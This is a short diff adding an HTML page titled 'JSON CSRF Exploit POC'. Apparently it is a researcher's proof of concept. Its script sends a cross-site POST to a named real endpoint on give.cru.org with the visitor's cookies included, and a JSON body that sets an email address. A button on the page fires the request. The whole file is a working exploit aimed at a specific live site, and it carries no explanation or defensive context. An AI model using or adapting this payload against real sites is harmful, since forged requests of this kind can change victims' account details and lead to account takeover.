@@ -1,0 +1,18 @@
+<html>
+<title>JSON CSRF Exploit POC</title>
+
+<body>
+    <center>
+        <h1> JSON CSRF Exploit POC</h1>
+
+        <script>
+            function JSON_CSRF() {
+                fetch('https://give.cru.org/cortex/emails/crugive/?followLocation=true', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: '{"email":"vanshal_gaur+4@rapid7.com"}' });
+			}
+        </script>
+
+        <button onclick="JSON_CSRF()">Exploit CSRF</button>
+    </center>
+</body>
+
+</html>
